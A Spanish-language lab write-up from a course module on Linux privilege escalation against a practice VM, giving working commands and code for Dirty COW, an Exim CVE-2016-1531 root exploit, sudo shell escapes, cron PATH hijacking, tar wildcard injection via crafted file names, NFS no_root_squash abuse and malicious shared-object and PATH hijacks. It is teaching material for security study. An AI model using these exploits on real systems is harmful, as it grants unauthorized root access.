---
title: Práctica de escalada de privilegios
modulo: M5 - Elevación de privilegios
fecha: 2025-07-28
vm: https://drive.google.com/file/d/1CPmXxtnrEXTs1B-zFp-TmDk0GSlk9q8B/view
layout: apunte
slug: 2025-07-28-prctica-escalada
---
>[!note] Credenciales de la máquina:
>user: user
>password: password321
>---
>user: root
>password: password123


# 🚪Primeros pasos
---
Entrar a la máquina con ssh.
```bash
ssh user@10.0.2.22 -oHostkeyAlgorithms=+ssh-rsa
```
* **Quién soy** `whoami`
* **Grupos del usuario** `groups`
* **Información de la distribución de la máquina y versión del kernel** `uname -a`


# 💥Explotación
---

## 🐮Dirty COW
>[!abstract] Definición:
**Dirty COW** es una vulnerabilidad en el kernel de Linux, identificada como: CVE-2016-5195
Fue descubierta en 2016 y se llama así porque afecta al mecanismo **Copy-On-Write (COW)** del kernel.  
De ahí: **Dirty COW** (por "COW sucia").

Este exploit permite que un usuario **sin privilegios** modifique archivos **de solo lectura**, incluyendo **archivos propiedad de root**, explotando un fallo en cómo el kernel maneja la memoria mapeada (`mmap`) con COW.

👉 Con esto, se pueden **sobrescribir binarios del sistema**, como `passwd`, o insertar una shell [[2025-07-28-permisos-suid-y-sgid\|SUID]] sin tener permisos reales.

**Para compilar:** 
```bash 
gcc -pthread c0w.c -o dirtyc0w
```
🔹Donde:
- `gcc` Es el compilador por defecto en Linux
* `-pthread` Especifica el archivo
- `-o` Especifica el nombre del archivo compilado

**Para ejecutar**: 
```bash
./dirtyc0w
```
 
 Una vez ejecutado, **para escalar privilegios** solo hace falta escribir el comando `paswd`
 **🎉 Escalada conseguida**


## ✉️Exim
>[!abstract] Definición:
>**Exim** es un servidor de correo (MTA) conocido por haber tenido vulnerabilidades de escalada y ejecución remota, por eso se busca en auditorías de seguridad.

Para conocer la versión instalada en la máquina víctima ejecutamos el comando
```bash
dpkg -l | grep exim
```
🔹 **Donde**:
- `dpkg` es el sistema de gestión de paquetes base
- `-l` ista todos los paquetes instalados
- `grep` es una herramienta para hacer búsquedas en texto
- `exim` es lo que nos interesa buscar

A partir de esto, buscamos en **exploit database** una vulnerabilidad que pueda aplicar. En este caso nos interesa este https://www.exploit-db.com/exploits/39549. 

Pero **OJO**,  al leer el exploit, nos indica que es **indispensable** que la versión de exim esté compilada con soporte para `Perl`, de lo contrario, no funcionará.

**¿Cómo saber si podemos aplicarlo?**

Según el documento, podemos revisarlo con el siguiente comando
```bash
exim -bV -v | grep -i Perl
```
🔹 **Donde**
- `-bV` muestra información de compilación y configuración de Exim
- `-v` (modo verbose) añade más detalle a la salida del `-bV`
- `grep -i Perl` Filtra la salida para mostrar **solo las líneas que contengan la palabra "Perl"**, sin importar mayúsculas o minúsculas (`-i` = "ignore case").

La salida debe mostrar algo como `Support for: crypteq iconv() Perl DKIM PRDR OCSP`, esto significa que si tiene soporte para Perl.

**💪 MANOS A LA OBRA**

En este caso, utilizamos el script que viene en la máquina, en `/home/user/tools/exim`, el cual contiene lo siguiente:
```bash
echo [ CVE-2016-1531 local root exploit
cat > /tmp/root.pm << EOF
package root;
use strict;
use warnings;

system(/bin/sh);
EOF
PERL5LIB=/tmp PERL5OPT=-Mroot /usr/exim/bin/exim -ps
```
**¿Qué hace?**
1. Imprime en pantalla el texto `[ CVE-2016-1531 local root exploit` (Meramente informativo)
2. Usa `cat` para crear un archivo en `/tmp/root.pm`. Este archivo es un **módulo Perl**. 
3. El contenido que está escrito entre los delimitadores `<< EOF` y `EOF` será lo que se escribirá en el archivo creado en el punto anterior
4. La última línea **ejecuta exim con Perl embebido activado**

**¿Qué se escribe en el archivo?**
Es un pequeño código en lenguaje Perl:
```Perl
package root;
use strict;
use warnings;

system(/bin/sh);
```
1. En primer lugar, define un paquete Perl llamado `root`
2. Al ser cargado, ejecuta inmediatamente `system(/bin/sh)`, lo que lanza una shell del sistema
3. Si Perl lo ejecuta como root... 🔓 La shell también es de root

**Desglose de la ejecución de exim**

Para entender la línea del script `PERL5LIB=/tmp PERL5OPT=-Mroot /usr/exim/bin/exim -ps`, tenemos que verlo así:
- `PERL5LIB=/tmp` Esto le dice a Perl que **busque módulos en `/tmp`**. Esto cobra sentido si recordamos que el mismo script creó previamente un módulo Perl en `/tmp/root.pm` 
- `PERL5OPT=-Mroot` Le dice a Perl: **“Carga automáticamente el módulo `root` al iniciar”**.
- `/usr/exim/bin/exim -ps` Esto ejecuta Exim con la opción `-ps`, que:
	- Lanza Exim como si estuviera procesando correos en modo **queue run**   
	- Si Exim fue compilado con soporte Perl embebido y sin sandbox, **carga el módulo y ejecuta `system(/bin/sh)` como root**

**🎯 Resultado**
- Exim carga el módulo `root.pm`
- Perl ejecuta `system("/bin/sh")`
- **Obtenemos una shell como root** si la explotación tiene éxito

**El exploit puede ser un poco enrevesado**, pero nosotros solo nos preocupamos de ejecutarlo con el comando
```bash
./cve-2016-1531.sh
```
**🎉 Escalada conseguida**


## 🔐SUDO

El comando `sudo -l` lista los comandos que el usuario actual **tiene permitidos ejecutar con `sudo`**, sin necesidad de contraseña si aparece `NOPASSWD:`. 

Algunos de los comandos tienen escalada de privilegios, más información disponible en [este repositorio](https://gtfobins.github.io/)

**En el caso de la máquina de práctica, se puede escalar privilegios de las siguientes formas:**
- **find** → `find` tiene una opción `-exec` que permite ejecutar comandos sobre los archivos encontrados. Si `find` se ejecuta como root, el comando ejecutado (`/bin/bash`) también será como root.

```bash
sudo find . -exec /bin/bash \;
```


- **Iftop** → Algunas versiones de `iftop` permiten ejecutar comandos del sistema con `!`. Si ejecutas `iftop` con `sudo`, el shell lanzado con `!/bin/sh` también se ejecuta como root. (NOTA: Este comportamiento puede no estar presente en todas las versiones.)

```bash
sudo iftop
!/bin/sh
```


- **nano** → Nano permite leer la salida de comandos usando `Ctrl+R` > `Ctrl+X`. Si escribes `reset; sh`, ejecuta el comando `sh` (shell), como root.

```bash
sudo nano
^R^X
reset; sh 1>&0 2>&0
``` 


- **vim** → Vim tiene un comando (`:!`) para ejecutar comandos del sistema. El `-c` permite ejecutar comandos automáticamente al iniciar. Si `vim` se ejecuta con sudo, cualquier comando lanzado con `:!` es como root.

```bash
sudo vim -c ':!/bin/sh'
```


- **man** → `man` usa `less` como visor de páginas. `less` permite ejecutar comandos con `!`. Por eso puedes escapar con `!sh`.

```bash
sudo man man
!/bin/sh
```


- **awk** → `awk` tiene la función `system()` que puede ejecutar comandos del sistema. Si usas `sudo` con `awk`, el shell lanzado por `system()` es con privilegios root.

```bash
sudo awk 'BEGIN {system("/bin/sh")}'
```


- **less** → Tanto `less` como `more` (paginadores de texto) tienen funciones para ejecutar comandos externos. Al presionar `!` seguido de un comando (`sh`), lo ejecutan como root.

```bash
sudo less /etc/profile
!/bin/sh
```


-  **ftp** → El cliente `ftp` clásico tiene una opción para ejecutar comandos del sistema usando `!`. Si `ftp` está corriendo con sudo, el shell resultante es de root.

```bash
sudo ftp
!/bin/sh
```


- **nmap** → Versiones antiguas de `nmap` tienen un modo interactivo que incluye un shell embebido con soporte para ejecutar comandos externos con `!`.

```bash
TF=$(mktemp)
echo 'os.execute("/bin/sh")' > $TF
sudo nmap --script=$TF
```


- **more** → Tanto `less` como `more` (paginadores de texto) tienen funciones para ejecutar comandos externos. Al presionar `!` seguido de un comando (`sh`), lo ejecutan como root.

```bash
TERM= sudo more /etc/profile
!/bin/sh
```


## ⏱️Crontab
>[!abstract] Definición:
>`crontab` viene de **cron**, que es un servicio de Linux para **ejecutar tareas programadas automáticamente** en horarios definidos, se encuentra en /etc/crontab

Podemos ver el crontab sin ser sudo, con el comando
```bash
cat /etc/crontab
```

Aparece algo como esto:
```bash
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/home/user:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# m h dom mon dow user  command
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
#
* * * * * root overwrite.sh
* * * * * root /usr/local/bin/compress.sh
```

🔹 **¿Qué nos interesa aqui?** 
La línea `* * * * * root overwrite.sh` significa que **cada minuto**, el usuario `root` ejecuta un archivo llamado `overwrite.sh`, y lo mismo sucede con `compress.sh`.

Sin embargo, para `overwrite.sh` **no está usando una ruta absoluta**, así que el sistema tiene que buscar **dónde está ese script**.

🔹 **¿Dónde buscaría el archivo?** 
La variable **PATH** establece el orden de búsqueda. (primero buscara en `/home/user`, después en `/usr/local/sbin`, y así sucesivamente). Esto significa que, **para este caso**, si creamos un archivo llamado `overwrite.sh` en `/home/user`, será el primero que encuentre, y por lo tanto, **el que ejecutará**

### 👉 Aprovechando overwrite.sh (creando uno propio)
**1. Crear un archivo** `overwrite.sh` en `/home/user` con el contenido:
```bash
#!/bin/bash 
cp /bin/bash /tmp/cronbash 
chmod +s /tmp/cronbash
```
🔹**Donde**:
- `#!/bin/bash` es la **"shebang line"**, y le dice al sistema que el script debe ejecutarse usando el **intérprete de Bash**. Puede omitirse, pero quizá no funcione como esperamos.
- `cp /bin/bash /tmp/cronbash` copia el ejecutable `bash` (la shell) desde su ubicación original en `/bin/` a `/tmp/`, con un nuevo nombre: `cronbash`
- `chmod +s /tmp/cronbash` otorga el permiso **[[2025-07-28-permisos-suid-y-sgid\|SUID]]** sobre el archivo `/tmp/cronbash`.

**2.  Configuración de permisos**

Para que el crontab pueda ejecutar nuestro archivo `overwrite.sh` debemos hacer que sea ejecutable con el comando
```bash
chmod +x overwrite.sh
```

**3. Ejecución**

Ahora solo queda esperar a que el crontab ejecute nuestro `overwrite.sh`, y si todo es correcto, veremos en `/tmp/` el archivo `cronbash` marcado en rojo, esto significa que **podemos ejecutarlo como root sin ser root**
```bash
cd /tmp/
./cronbash -p
```
- La flag `-p` indica que queremos ejecutar el archivo con los privilegios de root

**🎉 Escalada conseguida**

### 👉 Aprovechando overwrite.sh (sobrescribiendo el original)
**1. Buscamos el archivo original**

```bash
locate overwrite.sh
```
Este comando nos dará la ruta donde se encuentra el archivo original. En este caso, se encuentra en `/usr/local/bin/`

**2. Verificación de permisos**

Este método sólo funcionará si tenemos permisos de escritura sobre el archivo original
```bash
ls -la /usr/local/bin/overwrite.sh
```

**3. Rescribir el archivo original**

Utilizando `nano` o `vim`, colocamos lo siguiente dentro del script
```bash
#!/bin/bash 
cp /bin/bash /tmp/cronbash2 
chmod +s /tmp/cronbash2
```
**CONSEJO:** Hacer una copia del original antes de modificarlo, en caso de necesitar hacer un roll-back.

**4. Ejecución**

Esperamos a que el crontab ejecute el overwrite original. 

**NOTA:** Hay que borrar el `overwrite.sh` que está en el `/home/user`, o moverlo, o renombrarlo, o quitarle los permisos de ejecución. De lo contrario jamás se ejecutará el que creamos ahora.

Cuando se haya creado la shell, nos movemos a la carpeta donde se encuentra y la ejecutamos del mismo modo.
```bash
cd /tmp/
./cronbash -p
```

**🎉 Escalada conseguida**

### 👉 Aprovechando compress.sh
Recordemos que en el `crontab`, el script `compress.sh` está programado para ejecutarse cada minuto.

Lo primero será revisar qué hace el script que se encuentra en `/usr/local/bin/compress.sh`. Nos mostrará algo como lo siguiente:
```bash
#!/bin/sh
cd /home/user
tar czf /tmp/backup.tar.gz *
```
Nos interesa especialmente la última línea
🔹 **Donde**:
-  `tar` es el comando que se utiliza en linux para empaquetar archivos
- `czf` son opciones del comando
	- `c` (create) crea un nuevo archivo .tar
	- `z` (gzip) comprime utilizando gzip
	- `f` (file) flag para definir el nombre del archivo de salida
	- `/tmp/backup.tar.gz` es el nombre del archivo de salida
	- `*` **_todos_** los archivos y carpetas del directorio actual (`/home/user`)
En resumen: **crea un archivo comprimido con todo el contenido de `/home/user`, y lo guarda en `/tmp/backup.tar.gz`**.

**💥 ¿Dónde entra la explotación?**

En **cómo `tar` interpreta sus argumentos**. (Combinándolo con la información de https://gtfobins.github.io/gtfobins/tar/)

En teoría, Si creamos archivos en `/home/user` que **se llamen exactamente como las flags**:
```bash
--checkpoint=1
--checkpoint-action=exec=sh tarshell.sh
```
Entonces, cuando el crontab ejecute `tar czf /tmp/backup.tar.gz *`, será lo equivalente a
`tar czf /tmp/backup.tar.gz --checkpoint=1 --checkpoint-action=exec=sh tarshell.sh ...`

**¿Por qué funciona?**
- `--checkpoint=1`: le dice a tar que ejecute algo tras un archivo
- `--checkpoint-action=exec=...`: define lo que se va a ejecutar
🔫 En este caso: ejecuta `tarshell.sh`, y si `tar` corre como root (porque lo lanza `cron`), entonces el `tarshell.sh` también se ejecutará como root

**💪 MANOS A LA OBRA**

**1. Crear los archivos con nombres sospechosos**
Recordar que deben estar en `/home/user`
```bash
touch -- "--checkpoint=1"
touch -- "--checkpoint-action=exec=sh tarshell.sh"
```

**NOTA:** Normalmente el uso de guiones `-` y `--` está asociado a la **configuración de flags** en los comandos de linux, por lo que es posible que si solo ejecutamos `touch "--checkpoint=1"` nos interprete el `--checkpoint=1` como una flag del comando **touch** (la cual no existe) en lugar del nombre del archivo, y nos dé errores. 

Para evitarlo, entre el comando y el nombre del archivo colocamos `--` lo cual indica al sistema que **a partir de ese punto interprete todo lo demás como texto plano**. Esto funciona para cualquier comando.

Si después quisiéramos borrar estos archivos con nombres raros, ejecutaríamos un 
`rm -- "--checkpoint=1"`

**2. Crear el payload**

Recordemos que cuando se ejecute el `compress.sh` en el `cron`, se ejecutará internamente un tal `tarshell.sh`, así que vamos a crearlo en `/home/user` con el siguiente contenido
```bash
#!/bin/bash 
cp /bin/bash /tmp/tarbash 
chmod +s /tmp/tarbash
```

Y no olvidemos darle los **permisos de ejecución**
```bash
chmod +x tarshell.sh
```

**3. Ejecución**

Esperamos a que el `cron` haga su trabajo, y finalmente veremos la shell de root con permisos [[2025-07-28-permisos-suid-y-sgid\|SUID]] en `/tmp/` con el nombre `tarbash`
Ejecutamos como siempre
```bash
cd /tmp/
./tarbash -p
```

**🎉 Escalada conseguida**


## 📂NFS
>[!abstract] Definición:
>**NFS** (Network File System) es un protocolo que permite que un sistema Linux monte **directorios compartidos a través de la red**, como si fueran parte de su propio sistema de archivos.
>
🔹 Es decir: otro equipo (servidor NFS) comparte una carpeta, y tu máquina puede montarla y trabajar con ella como si estuviera local.

El archivo de configuración del **servidor NFS** se encuentra en `/etc/exports`. Ahí se especifica **qué carpetas se van a compartir**, con qué permisos y **qué máquinas o IPs pueden acceder**.

En el caso de nuestra máquina, vemos la línea
```bash
/tmp *(rw,sync,insecure,no_root_squash,no_subtree_check)
```
🔹 **Donde**:
- `/tmp` es la carpeta compartida
- `*` significa que cualquier usuario puede montarla
- `rw` son permisos de lectura y escritura
- `sync` (sincronización) significa que los cambios se escriben inmediatamente
- `insecure` significa que acepta conexiones desde puertos *no privilegiados*
- `no_root_squash` 🚨significa que el **root en la máquina cliente es también root sobre el NFS**
- `no_subtree_check` es una flag para desactivar la *verificación del subtree* (mejora el rendimiento)

**¿Cómo nos aprovechamos del no_root_squash?**
**1. En la Kali:** Revisamos las carpetas montables

```bash
showmount -e 10.0.2.22
```

**2. En la Kali:** Creamos una carpeta en la Kali para montar el recurso

```bash
sudo mkdir -p /mnt/nfs_tmp
```

**3. En la Kali:** Montar el NFS 

```bash
sudo mount -o rw,vers=3 10.0.2.22:/tmp /mnt/nfs_tmp
```

**4. En la víctima:** Crear la shell

```bash
cp /bin/bash /tmp/nfsbash
```

**5. En la Kali:** Cambiar **el propietario** del archivo (originalmente era `user`, pero queremos que sea `root`), así como el **grupo** para que también sea root, y le damos el permiso [[2025-07-28-permisos-suid-y-sgid\|SUID]]

```bash
cd /mnt/nfs_tmp/
sudo chown root nfsbash
sudo chgrp root nfsbash
sudo chmod +s nfsbash
```

**6. En la víctima:** Aparecerá `nfsbash` **marcada en rojo por el permiso [[2025-07-28-permisos-suid-y-sgid\|SUID]]**. La ejecutamos con el comando

```bash
./nfsbash -p
```

**🎉 Escalada conseguida**


## 📚Shared Object Hijacking
>[!abstract] Definición:
>**Shared Object Hijacking** es una técnica de explotación en sistemas Linux que consiste en forzar a un binario a cargar una biblioteca compartida (`.so`) maliciosa en lugar de la legítima, aprovechando rutas de búsqueda inseguras o configuraciones manipulables.  

Cuando el binario vulnerable posee el bit [[2025-07-28-permisos-suid-y-sgid\|SUID]] activado y se ejecuta con privilegios elevados, la biblioteca maliciosa se carga con los mismos privilegios, lo que permite al atacante escalar privilegios dentro del sistema.

Entonces, vamos a ver si podemos aplicarlo en esta máquina, partiendo del comando:
```bash
find / -type f -perm -04000 -ls 2>/dev/null
```
🔹 **Donde:** 
- `find /` inicia la búsqueda **desde la raíz del sistema de archivos** (`/`).
- `-type f` Filtra para que **solo muestre archivos normales** (no carpetas, ni symlinks, etc.).
- `-perm -04000` Esto busca archivos que tengan el **bit [[2025-07-28-permisos-suid-y-sgid\|SUID]] activado**.
	- `04000` es el modo octal del **SUID (Set User ID)**.
	- El `-` delante del número indica: _“busca archivos que tengan **al menos** este permiso”_.
- `ls` Es como un `ls -l` por cada archivo encontrado. Muestra información detallada de los archivos encontrados.
- `2>/dev/null` Esto redirige los errores (como “permission denied”) a `/dev/null`, es decir, **los oculta** para que la salida quede limpia.

Este comando es útil porque permite encontrar **archivos ejecutables con el bit SUID activado**, los cuales pueden ser explotados para escalar privilegios si son vulnerables, con esta información lo siguiente sería investigar uno por uno para ver si sus versiones tienen vulnerabilidades interesantes.

### 👉Escalando por `suid-so` 

Analizamos este recurso con
```bash
strace /usr/local/bin/suid-so 2>&1 | grep -i -E "open|access|no such file"
```
🔹 **Donde**
- `strace /usr/local/bin/suid-so` Ejecuta el binario `/usr/local/bin/suid-so` bajo **`strace`**, una herramienta que **muestra todas las llamadas al sistema** que realiza un programa (como `open()`, `read()`, `execve()`, etc.).
- `2>&1` Normalmente el comando solo mostraría los casos de éxito, pero nos interesan aquellos que dan error, así que los traemos con esta opción
- `grem -i -E` la flag `-i` ignora mayúsculas/minúsculas, mientras que `-E` permite usar expresiones regulares extendidas.
- `"open|access|no such file"` busca líneas que contengan:
	- `open`: intentos de abrir archivos
	- `access`: comprobaciones de acceso/permisos
	- `no such file`: errores por archivos inexistentes

**En esta máquina** nos arroja, entre otras cosas, que el binario `/usr/local/bin/suid-so` llama a un archivo `libcalc.so`, al cual busca en la ruta `/home/user/.config/` y **NO LO ENCUENTRA**.

Si nosotros tenemos libertad total en `/home/user/`, **¿Qué pasaría si creáramos nuestro propio libcalc.so?**

**💪 MANOS A LA OBRA**

**1.** Creamos la carpeta `.config` 

```bash
cd /home/user
mkdir .config
```

**2.** Creamos el arachivo `libcalc.c` **dentro de la carpeta `.config`** con el siguiente contenido:

```C
/*Bibliotecas estándar necesarias para funciones básicas de entrada/salida y manejo de procesos, como system()*/
#include <stdio.h>
#include <stdlib.h>

/*Declaramos una función llamada inject() y le aplicamos el atributo especial constructor*/
static void inject() __attribute__((constructor));

/*Función principal que nos creará una shell root*/
void inject() {
	system("cp /bin/bash /tmp/sobash && chmod +s /tmp/sobash");
	/*
	1. Llama a system() para ejecutar un comando en shell
	2. El comando copia /bin/bash en /tmp/sobash (basicamente, crea una shell)
	3. Luego le da el bit SUID (chmod +s)
	*/
}
```

**¿Por qué .c y no .so directamente?** la extensión `.so` indica que se trata de un fichero binario, en Linux, estos se programan en lenguaje C y posteriormente se compilan para que el sistema operativo pueda utilizarlos.

**3.** Compilamos el código

```bash
gcc libcalc.c -shared -o libcalc.so -fPIC
```

**4.** Ejecutamos **el binario que utiliza esta biblioteca**, es decir

```bash
/usr/local/bin/suid-so
```
Cuando finalice esta ejecución, veremos un nuevo archivo en `/tmp/`


**5.** Nos movemos a donde se creó el archivo y veremos que `sobash` aparece marcado en rojo, por los permisos **[[2025-07-28-permisos-suid-y-sgid\|SUID]]**. Lo ejecutamos como siempre

```bash
cd /tmp/
./sobash -p
```

**🎉 Escalada conseguida**


### 👉Escalando por `suid-env` 
Analizamos este recurso con el comando `strings` para saber qué alimenta a este binario. El comando `strings` lee archivos binarios y busca elementos legibles.

```bash
strings /usr/local/bin/suid-env
```

Del comando, obtenemos una salida como la siguiente

```
/lib64/ld-linux-x86-64.so.2
5q;Xq
__gmon_start__
libc.so.6
setresgid
setresuid
system
__libc_start_main
GLIBC_2.2.5
fff.
fffff.
l$ L
t$(L
|$0H
service apache2 start
```

En esta ocasión, intentaremos *confundir* a la máquina haciendo que ejecute un binario `service` que creamos nosotros, realizando cambios en el **PATH** del sistema.

**¿Por qué?** El *path* es una variable del sistema, donde el usuario puede especificar las rutas **donde el sistema pueda buscar cualquier binario** que el usuario desee ejecutar. Y si nosotros siendo el usuario podemos controlar el path, podemos cambiar cómo funciona.

Podemos consultar las variables del sistema con el comando `env`.

**💪 MANOS A LA OBRA**

En primer lugar, creamos el código malicioso, en la ruta `/home/user/` con el nombre `service.c` y escribimos el siguiente código.
```C
int main() {
	setgid(0); //Establece el GID (grupo) en 0 (grupo 0 = root)
	setuid(0); //Establece el UID (usuario) en 0 (usuario 0 = root)
	system("/bin/bash"); //Abre una shell
	return 0;
}
```

Y lo compilamos
```bash
gcc /home/user/service.c -o /home/user/service
```

Una vez creado el binario, toca modificar el **path**. Para ello, ejecutamos el comando
```bash
export PATH=/home/user:$PATH
```

**¿Qué está haciendo esta línea?** Básicamente decirle al sistema: quiero que la variable PATH comience con `/home/user`, los `:` delimitan donde termina una ruta, y `$PATH` es el valor que tenía anteriormente.

Comprobamos que los cambios hayan sido efectivos con el comando `env`. Y si la variable comienza con `/home/user` ya podemos continuar.

Ahora, solo queda ejecutar el binario principal
```bash
/usr/local/bin/suid-env
```

Y automáticamente, este binario nos convertirá en root. **🎉 Escalada conseguida**

### 👉Escalando por `suid-env2`
Del mismo modo que con `suid-env`, analizamos este binario con `strings`
```bash
strings /usr/local/bin/suid-env2
```

Vemos una salida similar al anterior, pero en este caso, la llamada a `service` se hace con una **ruta absoluta** por lo que crear uno en otra ruta controlada no es posible.

```
/lib64/ld-linux-x86-64.so.2
5q;Xq
__gmon_start__
libc.so.6
setresgid
setresuid
system
__libc_start_main
GLIBC_2.2.5
fff.
fffff.
l$ L
t$(L
|$0H
/usr/sbin/service apache2 start
```

❌ Y si verificamos qué permisos tenemos sobre el binario, tenemos permisos de lectura y ejecución, por lo que modificar el archivo original tampoco es una opción

✅ Lo que **sí** podemos intentar, es **crear una función a nivel bash con el mismo nombre**, pero que haga lo que nosotros queremos que haga (darnos privilegios).

>[!abstract] Definición exprés:
>Una **función en Bash** es una forma de agrupar comandos bajo un nombre para poder ejecutarlos fácilmente varias veces.
>**Son estructuras internas de Bash**, que viven en la **memoria del proceso de la shell**, y **no existen como archivos ni procesos**. Sólo son visibles dentro del mismo entorno de ejecución de la shell **hasta que se exportan**.

💪**MANOS A LA OBRA**

**1. Creamos** la función
```bash
function /usr/sbin/service() { cp /bin/bash /tmp/servicebash && chmod +s /tmp/servicebash; }
```

**2. La exportamos** para que esté dentro del entorno
```bash
export -f /usr/sbin/service
```
Comprobamos que se ha exportado si al ejecutar `env`, vemos nuestra función en la salida.

**3. Ejecutamos** el binario principal
```bash
/usr/local/bin/suid-env2
```

**4. Si todo es correcto**, veremos una nueva bash en `/tmp` llamada `servicebash`, la cual podemos ejecutar para acceder a root
```bash
./servicebash -p
```

**🎉 Escalada conseguida**

>[!note] Nota:
>Este tipo de exploit sólo funciona si se cumplen condiciones muy específicas, como que el binario esté **dinámicamente enlazado** con Bash, o que el binario **no limpie el entorno** antes de ejecutar comandos.